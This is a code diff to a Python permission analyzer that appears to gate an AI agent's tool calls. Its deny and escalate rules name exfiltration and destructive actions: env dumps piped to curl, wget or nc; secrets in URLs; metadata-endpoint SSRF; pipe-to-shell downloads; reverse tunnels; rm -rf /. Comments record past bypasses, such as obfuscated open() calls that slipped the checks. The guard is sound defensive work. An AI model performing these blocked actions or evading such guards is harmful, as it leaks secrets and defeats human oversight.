+                    "CRITICAL",
+                    "bash_web_egress_archive_pipe",
                     "Write to a file, inspect it, then send it explicitly.",
                 )
             secret = _url_secret_hit(cmd)
             if secret:
                 return self._deny(
-                    tool, cmd,
+                    tool,
+                    cmd,
                     f"Command reaches a network tool while also carrying what looks like "
                     f"credential material ('{secret}') — that co-occurrence isn't worth the risk.",
-                    "CRITICAL", f"bash_web_egress_secret:{secret}",
+                    "CRITICAL",
+                    f"bash_web_egress_secret:{secret}",
                     "Never pass a key/token to a network command on the command line.",
                 )
             var_match = _SENSITIVE_ENV_VAR_RE.search(cmd)
@@ -2176,21 +3232,25 @@ class PermissionAnalyzer:
                 # command in the same line). The reason below states what was
                 # actually detected instead of asserting a send that wasn't verified.
                 return self._deny(
-                    tool, cmd,
+                    tool,
+                    cmd,
                     f"Command reaches a network tool while also referencing "
                     f"what looks like a sensitive env var ('{var_match.group(0)}') "
                     "— even if unused here, that ambiguity isn't worth the risk.",
-                    "CRITICAL", "bash_web_egress_secret_envvar",
+                    "CRITICAL",
+                    "bash_web_egress_secret_envvar",
                     "Never interpolate a *_KEY/*_TOKEN/*_SECRET/*_PASSWORD env "
                     "var into a network command.",
                 )
             if _ENV_DUMP_TO_NET_RE.search(cmd):
                 return self._deny(
-                    tool, cmd,
+                    tool,
+                    cmd,
                     "Command sends the full process environment over the "
                     "network, either piped into a network tool or "
                     "redirected straight to a socket file descriptor.",
-                    "CRITICAL", "bash_web_egress_env_dump",
+                    "CRITICAL",
+                    "bash_web_egress_env_dump",
                     "Never pipe printenv/env output to curl/wget/nc/ncat/netcat/socat, "
                     "and never redirect it (>&N) to a socket fd — send only the "
                     "specific values needed.",
@@ -2201,15 +3261,18 @@ class PermissionAnalyzer:
             # looks perfectly ordinary.
             if _PY_ENV_TO_NET_RE.search(cmd):
                 return self._deny(
-                    tool, cmd,
+                    tool,
+                    cmd,
                     "Command hands the process environment to a network call "
                     "(os.environ inside an egress call).",
-                    "CRITICAL", "bash_web_egress_env_dump",
+                    "CRITICAL",
+                    "bash_web_egress_env_dump",
                     "Send only the specific values needed, never os.environ itself.",
                 )
             if _PIPE_TO_SHELL_RE.search(cmd):
                 return self._escalate(
-                    tool, cmd[:80],
+                    tool,
+                    cmd[:80],
                     "Command downloads remote content and pipes it directly into "
                     "a shell/interpreter — human review required.",
                     "bash_web_egress_pipe_to_shell",
@@ -2217,7 +3280,8 @@ class PermissionAnalyzer:
                 )
             if _SSH_REVERSE_TUNNEL_RE.search(cmd):
                 return self._escalate(
-                    tool, cmd[:80],
+                    tool,
+                    cmd[:80],
                     "Command opens an ssh reverse tunnel (-R) — human review required.",
                     "bash_web_egress_ssh_reverse_tunnel",
                     "Confirm this reverse tunnel is intended before approving.",
@@ -2232,19 +3296,26 @@ class PermissionAnalyzer:
                     _host = urllib.parse.urlparse(_url).hostname or ""
                 except Exception:
                     _host = ""
-                _risk = _host_egress_risk(_host)
+                try:
+                    _port = urllib.parse.urlparse(_url).port
+                except Exception:
+                    _port = None
+                _risk = _host_egress_risk(_host, _port)
                 if _risk:
                     _kind, _token = _risk
                     if _kind in ("sink", "metadata"):
                         return self._deny(
-                            tool, cmd,
+                            tool,
+                            cmd,
                             f"Command sends data to '{_token}' — a known "
                             "exfiltration/metadata endpoint.",
-                            "CRITICAL", f"bash_web_egress_sink_host:{_token}",
+                            "CRITICAL",
+                            f"bash_web_egress_sink_host:{_token}",
                             "Use the documented API host instead.",
                         )
                     return self._escalate(
-                        tool, cmd[:80],
+                        tool,
+                        cmd[:80],
                         f"Command reaches private/loopback host '{_token}' — human review required.",
                         f"bash_web_egress_private_host:{_token}",
                         "Confirm this local/private-network target is intended.",
@@ -2252,7 +3323,8 @@ class PermissionAnalyzer:
                 _blob = _opaque_blob_hit(_url)
                 if _blob:
                     return self._escalate(
-                        tool, cmd[:80],
+                        tool,
+                        cmd[:80],
                         f"Command carries an opaque token ('{_blob[:32]}…') in "
                         "an outbound URL — possible encoded payload.",
                         "bash_web_egress_opaque_blob",
@@ -2266,12 +3338,28 @@ class PermissionAnalyzer:
                 _risk = _host_egress_risk(_bare)
                 if _risk and _risk[0] in ("sink", "metadata"):
                     return self._deny(
-                        tool, cmd,
+                        tool,
+                        cmd,
                         f"Command sends data to '{_risk[1]}' — a known "
                         "exfiltration/metadata endpoint.",
-                        "CRITICAL", f"bash_web_egress_sink_host:{_risk[1]}",
+                        "CRITICAL",
+                        f"bash_web_egress_sink_host:{_risk[1]}",
                         "Use the documented API host instead.",
                     )
+        # A6: el AST dice que el payload es codigo ACTIVO y el comando nombra
+        # un path protegido. Esto se aprobaba: la heuristica de texto no ve
+        # `getattr(__builtins__, 'op' + 'en')`.
+        if _interpreter_code_is_active(cmd) and _mentions_protected_path(cmd):
+            return self._escalate(
+                tool,
+                cmd[:80],
+                "Code handed to an interpreter is not statically inert and "
+                "the command names a protected path — its runtime effect "
+                "cannot be checked, human review required.",
+                "bash_interpreter_code_touches_protected_path",
+                "Run the write as an explicit shell command, or confirm the "
+                "code with the user before approving.",
+            )
         return None
 
     def _read_touches_credential(self, tool: str, path: str) -> dict | None:
@@ -2382,60 +3470,73 @@ class PermissionAnalyzer:
             parsed = urllib.parse.urlparse(raw)
         except Exception:
             return self._deny(
-                tool, url[:80],
+                tool,
+                url[:80],
                 f"{tool} blocked: URL could not be parsed for egress review.",
-                "HIGH", "web_egress_unparseable",
+                "HIGH",
+                "web_egress_unparseable",
                 "Supply a plain https:// URL.",
             )
 
         scheme = (parsed.scheme or "").lower()
         if scheme and scheme not in _WEB_ALLOWED_SCHEMES:
             return self._deny(
-                tool, url[:80],
+                tool,
+                url[:80],
                 f"{tool} blocked: scheme '{scheme}' is not http/https.",
-                "CRITICAL", f"web_egress_scheme:{scheme}",
+                "CRITICAL",
+                f"web_egress_scheme:{scheme}",
                 "Use Read for local files. This tool accepts http(s) URLs only.",
             )
 
         if parsed.username or parsed.password:
             return self._deny(
-                tool, url[:80],
+                tool,
+                url[:80],
                 f"{tool} blocked: URL embeds userinfo credentials (user:pass@host).",
-                "CRITICAL", "web_egress_userinfo",
+                "CRITICAL",
+                "web_egress_userinfo",
                 "Fetch the public URL. Authenticated URLs are not supported here.",
             )
 
         secret = _url_secret_hit(raw)
         if secret:
             return self._deny(
-                tool, url[:80],
+                tool,
+                url[:80],
                 f"{tool} blocked: URL carries credential material ('{secret}') — "
                 "this is exfiltration, not a lookup.",
-                "CRITICAL", f"web_egress_secret:{secret}",
+                "CRITICAL",
+                f"web_egress_secret:{secret}",
                 "Never place a key, token or private key in an outbound URL.",
             )
 
-        risk = _host_egress_risk(parsed.hostname or "")
+        risk = _host_egress_risk(parsed.hostname or "", parsed.port)
         if risk:
             kind, token = risk
             if kind == "sink":
                 return self._deny(
-                    tool, url[:80],
+                    tool,
+                    url[:80],
                     f"{tool} blocked: '{token}' is a request-capture endpoint "
                     "whose only purpose is receiving exfiltrated data.",
-                    "CRITICAL", f"web_egress_sink_host:{token}",
+                    "CRITICAL",
+                    f"web_egress_sink_host:{token}",
                     "Fetch the real documentation or API host instead.",
                 )
             if kind == "metadata":
                 return self._deny(
-                    tool, url[:80],
+                    tool,
+                    url[:80],
                     f"{tool} blocked: '{token}' is a link-local/cloud-metadata "
                     "address (SSRF credential grab).",
-                    "CRITICAL", f"web_egress_metadata_host:{token}",
+                    "CRITICAL",
+                    f"web_egress_metadata_host:{token}",
                     "Instance metadata is never a legitimate research target.",
                 )
             return self._escalate(
-                tool, url[:80],
+                tool,
+                url[:80],
                 f"{tool} to private/loopback host '{token}' — needs human review.",
                 f"web_egress_private_host:{token}",
                 "Local services are reached with Bash curl, not a fetch tool, so "
@@ -2446,7 +3547,8 @@ class PermissionAnalyzer:
         blob = _opaque_blob_hit(raw)
         if blob:
             return self._escalate(
-                tool, url[:80],
+                tool,
+                url[:80],
                 f"{tool} carries an opaque {len(blob)}+ char token "
                 f"('{blob[:32]}…') — possible encoded payload. Human review required.",
                 "web_egress_opaque_blob",
@@ -2483,8 +3585,7 @@ class PermissionAnalyzer:
             file_path = inp.get("file_path", inp.get("path", ""))
             real_path = os.path.realpath(os.path.normpath(file_path))
             in_safe_dir = any(
-                real_path.startswith(os.path.realpath(safe))
-                for safe in SAFE_PROJECT_DIRS
+                real_path.startswith(os.path.realpath(safe)) for safe in SAFE_PROJECT_DIRS
             )
             if in_safe_dir:
                 # GOVERNANCE_PATHS excluded too: the whole governance corpus
@@ -2500,9 +3601,7 @@ class PermissionAnalyzer:
                 # maintainability only, not a security fix (no bypass here was
                 # ever open that the old and new matcher disagree on).
                 if not _blocked_path_hit(real_path) and not _governance_path_hit(real_path):
-                    return self._approve(
-                        "Safe project directory", "LOW", "safe_project_dir"
-                    )
+                    return self._approve("Safe project directory", "LOW", "safe_project_dir")
 
         # 0b block removed — learned_approvals moved after CRITICAL_PATTERNS (see 4a)
 
@@ -2524,10 +3623,12 @@ class PermissionAnalyzer:
         except Exception as _cpe:
             log.warning("permission_analyzer: _candidate_paths failed: %s", _cpe)
             return self._deny(
-                tool, str(detail)[:80],
+                tool,
+                str(detail)[:80],
                 f"Internal analyzer error ({type(_cpe).__name__}) during path "
                 "extraction — denying as precaution.",
-                "HIGH", "analyzer_internal_error",
+                "HIGH",
+                "analyzer_internal_error",
                 "Retry, or ask the user to perform this write manually.",
             )
         for path in _candidates:
@@ -2555,13 +3656,6 @@ class PermissionAnalyzer:
                     "then have them apply it or re-run with explicit approval. "
                     "Autonomous mode does not waive this.",
                 )
-
-        # 3b. Resource claims — block if another agent holds the file
-        if tool in ("Edit", "Write", "MultiEdit"):
-            path = inp.get("file_path", inp.get("path", ""))
-            claim_deny = self._check_resource_claim(tool, path, _session)
-            if claim_deny:
-                return claim_deny
 
         # Extract Bash command once for all Bash checks (3c, 4, 4b).
         # 2026-08-18: mcp__context-mode__ctx_execute* is an arbitrary
@@ -2592,28 +3686,41 @@ class PermissionAnalyzer:
                 # stress test, 2026-08-11).
                 log.warning("permission_analyzer: _bash_touches_blocked failed: %s", _bte)
                 return self._deny(
-                    tool, str(cmd)[:80],
+                    tool,
+                    str(cmd)[:80],
                     f"Internal analyzer error ({type(_bte).__name__}) during "
                     "blocked-path check — denying as precaution.",
-                    "HIGH", "analyzer_internal_error",
+                    "HIGH",
+                    "analyzer_internal_error",
                     "Retry, or ask the user to run this command manually.",
                 )
 
         # 3d. Credential enforcement for the read family (mirror of 3c for Bash).
         # Must run before 4a (learned_approvals) so a historically-seen path
         # can never whitelist a credential read.
-        if tool in ("Read", "Grep", "Glob", "mcp__context-mode__ctx_execute_file", "Artifact"):
+        if tool in (
+            "Read",
+            "Grep",
+            "Glob",
+            "mcp__context-mode__ctx_execute_file",
+            "Artifact",
+        ):
             try:
                 _read_block = self._read_family_credential_block(tool, inp)
                 if _read_block:
                     return _read_block
             except Exception as _rte:
-                log.warning("permission_analyzer: _read_family_credential_block failed: %s", _rte)
+                log.warning(
+                    "permission_analyzer: _read_family_credential_block failed: %s",
+                    _rte,
+                )
                 return self._deny(
-                    tool, str(inp.get("file_path", inp.get("path", "")))[:80],
+                    tool,
+                    str(inp.get("file_path", inp.get("path", "")))[:80],
                     f"Internal analyzer error ({type(_rte).__name__}) during "
                     "credential check — denying as precaution.",
-                    "HIGH", "analyzer_internal_error",
+                    "HIGH",
+                    "analyzer_internal_error",
                     "Retry, or ask the user to check this file manually.",
                 )
 
@@ -2631,10 +3738,12 @@ class PermissionAnalyzer:
             except Exception as _mce:
                 log.warning("permission_analyzer: MCP credential check failed: %s", _mce)
                 return self._deny(
-                    tool, str(detail)[:80],
+                    tool,
+                    str(detail)[:80],
                     f"Internal analyzer error ({type(_mce).__name__}) during "
                     "MCP credential check — denying as precaution.",
-                    "HIGH", "analyzer_internal_error",
+                    "HIGH",
+                    "analyzer_internal_error",
                     "Retry, or ask the user to perform this call manually.",
                 )
 
@@ -2677,10 +3786,12 @@ class PermissionAnalyzer:
             except Exception as _wee:
                 log.warning("permission_analyzer: _web_egress_block failed: %s", _wee)
                 return self._deny(
-                    tool, str(inp.get("url", ""))[:80],
+                    tool,
+                    str(inp.get("url", ""))[:80],
                     f"Internal analyzer error ({type(_wee).__name__}) during "
                     "web egress check — denying as precaution.",
-                    "HIGH", "analyzer_internal_error",
+                    "HIGH",
+                    "analyzer_internal_error",
                     "Retry, or ask the user to fetch this URL manually.",
                 )
 
@@ -2697,9 +3808,11 @@ class PermissionAnalyzer:
             _secret = _url_secret_hit(_payload_text)
             if _secret:
                 return self._deny(
-                    tool, _payload_text[:80],
+                    tool,
+                    _payload_text[:80],
                     f"MCP call carries credential material ('{_secret}') in its arguments.",
-                    "CRITICAL", f"mcp_payload_secret:{_secret}",
+                    "CRITICAL",
+                    f"mcp_payload_secret:{_secret}",
                     "Never pass a key/token as an MCP tool argument — read it via "
                     "os.environ.get() only where the code that needs it runs.",
                 )
@@ -2749,23 +3862,27 @@ class PermissionAnalyzer:
                 for _pattern in CRITICAL_PATTERNS:
                     if re.search(_pattern, _ansi_c_decoded, re.IGNORECASE):
                         _ansi_hit = _pattern
-                        _ansi_label = _CRITICAL_PATTERN_LABELS.get(_pattern, "unlabeled catastrophic pattern")
+                        _ansi_label = _CRITICAL_PATTERN_LABELS.get(
+                            _pattern, "unlabeled catastrophic pattern"
+                        )
                         break
                 if not _ansi_hit:
                     for _pattern, _rule in HIGH_RISK_PATTERNS:
                         if re.search(_pattern, _ansi_c_decoded, re.IGNORECASE):
                             _ansi_hit = _rule
-                            _ansi_label = _HIGH_RISK_PATTERN_LABELS.get(_rule, "unlabeled high-risk pattern")
+                            _ansi_label = _HIGH_RISK_PATTERN_LABELS.get(
+                                _rule, "unlabeled high-risk pattern"
+                            )
                             break
             if _ansi_hit:
                 return self._escalate(
-                    tool, _bash_cmd[:80],
+                    tool,
+                    _bash_cmd[:80],
                     f"Command contains an ANSI-C quoted ($'...') span that "
                     f"decodes to a high-risk pattern ('{_ansi_label}') — human "
                     "review required.",
                     f"bash_ansi_c_obfuscated:{_ansi_hit}",
-                    "Confirm the decoded command's intent with the user "
-                    "before approving.",
+                    "Confirm the decoded command's intent with the user " "before approving.",
                 )
 
         # [S5] Decoded-payload-piped-to-shell — base64/openssl/xxd/uudecode
@@ -2779,7 +3896,8 @@ class PermissionAnalyzer:
         # reach; only the direct pipe form is covered.
         if tool == "Bash" and _bash_cmd and _OBFUSCATED_DECODE_PIPE_RE.search(_bash_cmd):
             return self._escalate(
-                tool, _bash_cmd[:80],
+                tool,
+                _bash_cmd[:80],
                 "Command decodes a base64/openssl/xxd/uudecode payload "
                 "directly into a shell/interpreter — human review required.",
                 "bash_obfuscated_decode_pipe_to_shell",
@@ -2795,30 +3913,38 @@ class PermissionAnalyzer:
                 for _tgt in _rm_destructive_targets(cmd):
                     if _tgt == "/":
                         return self._deny(
-                            tool, cmd,
+                            tool,
+                            cmd,
                             f"Catastrophic command blocked: recursive-force rm "
                             f"targeting root filesystem: '{cmd[:80]}'",
-                            "CRITICAL", "critical_pattern:rm_rf_root",
+                            "CRITICAL",
+                            "critical_pattern:rm_rf_root",
                             "This command is irreversible and catastrophic.",
                         )
                 for pattern in CRITICAL_PATTERNS:
                     if re.search(pattern, cmd, re.IGNORECASE) or (
                         _sql_decommented and re.search(pattern, _sql_decommented, re.IGNORECASE)
                     ):
-                        _label = _CRITICAL_PATTERN_LABELS.get(pattern, "unlabeled catastrophic pattern")
+                        _label = _CRITICAL_PATTERN_LABELS.get(
+                            pattern, "unlabeled catastrophic pattern"
+                        )
                         return self._deny(
-                            tool, cmd,
+                            tool,
+                            cmd,
                             f"Catastrophic command blocked ({_label}): '{cmd[:80]}'",
-                            "CRITICAL", f"critical_pattern:{pattern}",
+                            "CRITICAL",
+                            f"critical_pattern:{pattern}",
                             "This command is irreversible and catastrophic.",
                         )
             except Exception as _ce:
                 log.warning("permission_analyzer: CRITICAL pattern check failed: %s", _ce)
                 return self._deny(
-                    tool, str(inp.get("command", ""))[:80],
+                    tool,
+                    str(inp.get("command", ""))[:80],
                     f"Internal analyzer error ({type(_ce).__name__}) during "
                     "critical check — denying as precaution.",
-                    "HIGH", "analyzer_internal_error",
+                    "HIGH",
+                    "analyzer_internal_error",
                     "Retry with a valid command string.",
                 )
 
@@ -2833,18 +3959,22 @@ class PermissionAnalyzer:
                 if _rm_hits and not self._rm_target_is_allowed(cmd):
                     if DQIII8_MODE == "autonomous":
                         return self._deny(
-                            tool, cmd,
+                            tool,
+                            cmd,
                             f"High-risk command in autonomous mode (recursive-force rm "
                             f"outside ALLOWED_DELETIONS): {cmd[:80]}",
-                            "HIGH", "high_risk_pattern:rm_rf",
+                            "HIGH",
+                            "high_risk_pattern:rm_rf",
                             "Use ALLOWED_DELETIONS or run in supervised mode.",
                         )
                     else:
                         return self._deny(
-                            tool, cmd,
+                            tool,
+                            cmd,
                             f"Blocked command (recursive-force rm outside "
                             f"ALLOWED_DELETIONS): '{cmd[:80]}'",
-                            "CRITICAL", "high_risk_pattern:rm_rf",
+                            "CRITICAL",
+                            "high_risk_pattern:rm_rf",
                             "This command is destructive and irreversible.",
                         )
                 # [S4] git push --delete / :<ref> targeting a protected
@@ -2855,9 +3985,11 @@ class PermissionAnalyzer:
                     _del_ref = _git_push_deleted_ref(cmd)
                     if _del_ref and _is_protected_branch(_del_ref):
                         return self._deny(
-                            tool, cmd,
+                            tool,
+                            cmd,
                             f"git push deletes protected branch '{_del_ref}': '{cmd[:80]}'",
-                            "CRITICAL", "high_risk_pattern:git_push_delete_protected_branch",
+                            "CRITICAL",
+                            "high_risk_pattern:git_push_delete_protected_branch",
                             "Protected branches (main/master/production/release/"
                             "develop/trunk/staging/prod/premium-main/premium-full, "
                             "release/*, hotfix/*) cannot be deleted from a session.",
@@ -2872,7 +4004,8 @@ class PermissionAnalyzer:
                 for _vac_sql in (cmd, _sql_decommented):
                     if _vac_sql and _SQL_VACUUM_INTO_RE.search(_vac_sql):
                         return self._escalate(
-                            tool, cmd[:80],
+                            tool,
+                            cmd[:80],
                             "VACUUM INTO copies the entire database to an "
                             "arbitrary destination — human confirmation required.",
                             "sql_vacuum_into_arbitrary_copy",
@@ -2885,12 +4018,14 @@ class PermissionAnalyzer:
                 _lit = _sql_literal_tautology(cmd) or (
                     _sql_decommented and _sql_literal_tautology(_sql_decommented)
                 )
-                if _lit:
+                if _lit and (tool != "Bash" or _sql_table_check_scoped_to_production(cmd)):
                     return self._deny(
-                        tool, cmd,
+                        tool,
+                        cmd,
                         f"Unbounded DELETE on an audit table: predicate "
                         f"'{_lit}' is always true — '{cmd[:80]}'",
-                        "CRITICAL", "high_risk_pattern:sql_literal_tautology",
+                        "CRITICAL",
+                        "high_risk_pattern:sql_literal_tautology",
                         "Bound the DELETE with a real predicate, or use "
                         "bin/core/action_log.py for legitimate writes.",
                     )
@@ -2898,28 +4033,40 @@ class PermissionAnalyzer:
                     if re.search(pattern, cmd, re.IGNORECASE) or (
                         _sql_decommented and re.search(pattern, _sql_decommented, re.IGNORECASE)
                     ):
+                        if (
+                            tool == "Bash"
+                            and _rule in _DB_TABLE_PROTECTION_RULE_IDS
+                            and not _sql_table_check_scoped_to_production(cmd)
+                        ):
+                            continue
                         _label = _HIGH_RISK_PATTERN_LABELS.get(_rule, "unlabeled high-risk pattern")
                         if DQIII8_MODE == "autonomous":
                             return self._deny(
-                                tool, cmd,
+                                tool,
+                                cmd,
                                 f"High-risk command in autonomous mode ({_label}): {cmd[:80]}",
-                                "HIGH", f"high_risk_pattern:{_rule}",
+                                "HIGH",
+                                f"high_risk_pattern:{_rule}",
                                 "Use ALLOWED_DELETIONS or run in supervised mode.",
                             )
                         else:
                             return self._deny(
-                                tool, cmd,
+                                tool,
+                                cmd,
                                 f"Blocked command ({_label}): '{cmd[:80]}'",
-                                "CRITICAL", f"high_risk_pattern:{_rule}",
+                                "CRITICAL",
+                                f"high_risk_pattern:{_rule}",
                                 "This command is destructive and irreversible.",
                             )
             except Exception as _he:
                 log.warning("permission_analyzer: HIGH_RISK pattern check failed: %s", _he)
                 return self._deny(
-                    tool, str(inp.get("command", ""))[:80],
+                    tool,
+                    str(inp.get("command", ""))[:80],
                     f"Internal analyzer error ({type(_he).__name__}) during "
                     "high-risk check — denying as precaution.",
-                    "HIGH", "analyzer_internal_error",
+                    "HIGH",
+                    "analyzer_internal_error",
                     "Retry with a valid command string.",
                 )
 
@@ -2927,9 +4074,7 @@ class PermissionAnalyzer:
         # checks. A historically-safe pattern can never override
         # any of those denies, even latently.
         if self._is_learned_safe(tool, detail):
-            return self._approve(
-                "Pattern approved by history", "LOW", "learned_approval"
-            )
+            return self._approve("Pattern approved by history", "LOW", "learned_approval")
 
         # 5. Autonomous mode — auto-approve standard tools (after checks)
         if DQIII8_MODE == "autonomous" and tool in AUTO_APPROVE_TOOLS:
@@ -3010,29 +4155,49 @@ class PermissionAnalyzer:
         If the same tool+action_detail has been rejected MAX_SAME_REJECTION
         times (DENY or ESCALATE) in this session → return ESCALATE.
         FIX C: counts both DENY and ESCALATE.
+
+        `detail` is anchored via `_dedup_anchor()`, then compared for EXACT
+        equality against every candidate row's own anchor — not a truncated-
+        prefix LIKE. Root cause of a real false positive (found 2026-09-02,
+        general case): any two commands sharing a long literal prefix (a `cd
+        <path> &&` habit, a repeated `cat >> ...`/`python3 -c "..."` authoring
+        pattern — all three hit live, same session) collided the instant that
+        shared prefix reached the old 50-char truncation, regardless of what
+        came after it or whether the commands were related at all. Comparing
+        the FULL anchored text removes prefix length from the matching
+        criterion entirely: two commands are "the same repeated action" only
+        if they really are the same (after stripping cwd-navigation
+        boilerplate), never merely because they start the same way. A
+        genuinely repeated command (retried verbatim) still matches itself
+        every time, so the loop-breaker's real purpose is unaffected.
+
+        Candidate rows are fetched by the cheap indexed filters only (session/
+        tool/decision/window) — row counts here are a handful per session, so
+        comparing anchors in Python instead of via SQL LIKE has no meaningful
+        cost and buys exactness.
         """
         _session = session_id or SESSION_ID
+        anchor = _dedup_anchor(detail)
         try:
             conn = sqlite3.connect(str(DB_PATH), timeout=10)
-            row = conn.execute(
+            rows = conn.execute(
                 """
-                SELECT COUNT(*) FROM permission_decisions
+                SELECT action_detail FROM permission_decisions
                 WHERE session_id = ?
                   AND tool_name = ?
-                  AND action_detail LIKE ?
                   AND decision IN ('DENY', 'ESCALATE')
                   AND timestamp > datetime('now', '-2 hours')
                 """,
-                (_session, tool, f"%{detail[:50]}%"),
-            ).fetchone()
+                (_session, tool),
+            ).fetchall()
+            conn.close()
 
-            count = row[0] if row else 0
+            count = sum(1 for (stored,) in rows if _dedup_anchor(stored or "") == anchor)
             if count >= MAX_SAME_REJECTION:
-                conn.close()
                 return {
                     "decision": "ESCALATE",
                     "reason": (
-                        f"Action '{tool}: {detail[:60]}' rejected "
+                        f"Action '{tool}: {anchor[:60]}' rejected "
                         f"{count} times in this session. "
                         "Requires human decision."
                     ),
@@ -3045,17 +4210,17 @@ class PermissionAnalyzer:
                         f"Previous attempts: {count}."
                     ),
                 }
-            conn.close()
             # Reset in-process fallback if DB is healthy
-            _key = f"{tool}|{detail[:50]}"
+            _key = f"{tool}|{anchor}"
             with _proc_rejection_lock:
                 _proc_rejection_counts.pop(_key, None)
         except Exception as e:
             log.warning(
                 "permission_analyzer: _check_repeat_rejections query failed "
-                "— using in-process counter: %s", e
+                "— using in-process counter: %s",
+                e,
             )
-            _key = f"{tool}|{detail[:50]}"
+            _key = f"{tool}|{anchor}"
             with _proc_rejection_lock:
                 _proc_rejection_counts[_key] = _proc_rejection_counts.get(_key, 0) + 1
                 _count = _proc_rejection_counts[_key]
@@ -3063,7 +4228,7 @@ class PermissionAnalyzer:
                 return {
                     "decision": "ESCALATE",
                     "reason": (
-                        f"Action '{tool}: {detail[:60]}' rejected "
+                        f"Action '{tool}: {anchor[:60]}' rejected "
                         f"{_count} times (in-process counter — DB unavailable). "
                         "Requires human decision."
                     ),
@@ -3095,54 +4260,6 @@ class PermissionAnalyzer:
         except Exception:
             return False
 
-    def _check_resource_claim(
-        self, tool: str, path: str, session_id: str
-    ) -> dict | None:
-        """
-        Blocks if another agent/session holds an active claim on this resource.
-        Claims expire automatically by TTL (expires_at).
-        """
-        if not path:
-            return None
-        try:
-            conn = sqlite3.connect(str(DB_PATH), timeout=10)
-            row = conn.execute(
-                """
-                SELECT agent, session_id FROM resource_claims
-                WHERE resource = ?
-                  AND session_id != ?
-                  AND expires_at > datetime('now')
-                LIMIT 1
-                """,
-                (path, session_id),
-            ).fetchone()
-            conn.close()
-            if row:
-                holder_agent, holder_session = row
-                return self._deny(
-                    tool,
-                    path,
-                    f"Resource '{path}' locked by agent '{holder_agent}' "
-                    f"(session {holder_session[:8]}…). Wait for the claim to expire.",
-                    "MEDIUM",
-                    "resource_claim",
-                    "Wait 30 min or ask the owning agent to release the resource.",
-                )
-        except Exception as e:
-            # Fail CLOSED, same contract as block 4b: a check that ran and
-            # errored is not a check that passed. Returning None here made the
-            # multi-agent write lock silently cease to exist whenever the DB was
-            # locked/missing/corrupt.
-            log.warning("permission_analyzer: _check_resource_claim query failed: %s", e, exc_info=True)
-            return self._deny(
-                tool, path,
-                f"Internal analyzer error ({type(e).__name__}) during "
-                "resource-claim check — denying as precaution.",
-                "HIGH", "analyzer_internal_error",
-                "Retry once the permissions DB is reachable.",
-            )
-        return None
-
     def _check_budget(self, session_id: str) -> dict | None:
         """Blocks if estimated session cost exceeds MAX_SESSION_COST_USD."""
         try:
@@ -3159,8 +4276,7 @@ class PermissionAnalyzer:
                 return self._deny(
                     "budget",
                     f"${estimated_cost:.2f}",
-                    f"Session budget exceeded: "
-                    f"${estimated_cost:.2f} > ${MAX_SESSION_COST_USD}",
+                    f"Session budget exceeded: " f"${estimated_cost:.2f} > ${MAX_SESSION_COST_USD}",
                     "HIGH",
                     "budget_exceeded",
                     "Split the objective into smaller subtasks. "
@@ -3173,10 +4289,12 @@ class PermissionAnalyzer:
             # corrupt, which is not a theoretical state under a concurrent writer.
             log.warning("permission_analyzer: _check_budget query failed: %s", e, exc_info=True)
             return self._deny(
-                "budget", session_id,
+                "budget",
+                session_id,
                 f"Internal analyzer error ({type(e).__name__}) during "
                 "budget check — denying as precaution.",
-                "HIGH", "analyzer_internal_error",
+                "HIGH",
+                "analyzer_internal_error",
                 "Retry once the permissions DB is reachable.",
             )
         return None
@@ -3207,7 +4325,11 @@ def _notify_telegram_activation(tool_name: str, pattern: str) -> None:
             timeout=5,
         )
     except Exception as e:
-        log.warning("permission_analyzer: _notify_telegram_activation send failed: %s", e, exc_info=True)  # never block the pipeline
+        log.warning(
+            "permission_analyzer: _notify_telegram_activation send failed: %s",
+            e,
+            exc_info=True,
+        )  # never block the pipeline
 
 
 def _notify_telegram_escalation(entry: dict) -> None:
@@ -3218,33 +4340,216 @@ def _notify_telegram_escalation(entry: dict) -> None:
     "routed to the operator... resume only after the human confirms". Before
     this, ESCALATE only reached `tasks/permission_rejection.json`, which
     nothing reads (no `OrchestratorLoop` class exists in this codebase).
-    """
-    try:
-        import requests
-        from dotenv import load_dotenv
 
-        load_dotenv(str(DQIII8_ROOT / ".env"))
-        token = os.getenv("TELEGRAM_BOT_TOKEN", "")
-        chat_id = os.getenv("TELEGRAM_CHAT_ID", "")
-        if not token or not chat_id:
-            return
+    Delegates delivery to `bin.core.notify.send_telegram()` instead of
+    reimplementing the POST: that helper's token lookup falls back through
+    DQIII8_BOT_TOKEN -> TELEGRAM_BOT_TOKEN -> JARVIS_BOT_TOKEN, and this
+    codebase's `.env` only sets DQIII8_BOT_TOKEN. The old inline
+    implementation here checked TELEGRAM_BOT_TOKEN only, so it always found
+    an empty token and silently no-op'd — every ESCALATE since this hook was
+    added went unnotified (found 2026-09-02, confirmed live: DQIII8_BOT_TOKEN
+    set, TELEGRAM_BOT_TOKEN unset). health_watchdog.py already used the
+    fallback-aware helper, which is why its alerts always arrived.
+
+    No `parse_mode`: a governance file path routinely contains `_`
+    (`user_prompt_submit.py`), which legacy Telegram Markdown reads as an
+    unmatched italic delimiter and rejects with HTTP 400 — confirmed live
+    2026-09-02, a second independent way this alert could go unsent even
+    after the token fix. Plain text never has this failure mode.
+
+    Skips governance-write rule_triggered prefixes (`_GOVERNANCE_WRITE_RULE_PREFIXES`):
+    pre_tool_use.py sends those through `_request_governance_approval()` instead,
+    which posts its own inline Si/No button message — sending both here too would
+    double-notify for the exact same event.
+    """
+    if any(
+        (entry.get("rule_triggered") or "").startswith(p) for p in _GOVERNANCE_WRITE_RULE_PREFIXES
+    ):
+        return
+    try:
+        import sys
+
+        sys.path.insert(0, str(DQIII8_ROOT))
+        from bin.core.notify import send_telegram
+
         msg = (
-            "🚧 *Permission ESCALATE*\n"
-            f"`{entry['tool_name']}` → `{entry['action_detail'][:150]}`\n"
+            "Permission ESCALATE\n"
+            f"{entry['tool_name']} -> {entry['action_detail'][:150]}\n"
             f"Reason: {entry['reason'] or '(none)'}\n"
             f"Rule: {entry['rule_triggered'] or '(none)'}\n"
             "Blocked until a human confirms in a new session."
         )
-        requests.post(
-            f"https://api.telegram.org/bot{token}/sendMessage",
-            json={"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"},
-            timeout=5,
-        )
+        # retries=1: send_telegram's default (3 attempts, 10s timeout each,
+        # plus a Telegram-429 backoff sleep between them) can block this
+        # "never block the pipeline" channel for 30s+ under a burst of
+        # ESCALATEs (a retried agent action, a repeat-rejection storm) —
+        # confirmed live 2026-09-07 stress test: bursts of identical
+        # governance-write ESCALATEs hit Telegram's per-chat rate limit,
+        # and the resulting 429 retry/backoff loop stalled EVERY subsequent
+        # hook invocation, not just the ones actually waiting on a human tap.
+        # One attempt is enough for a best-effort notify — Channels 1/2
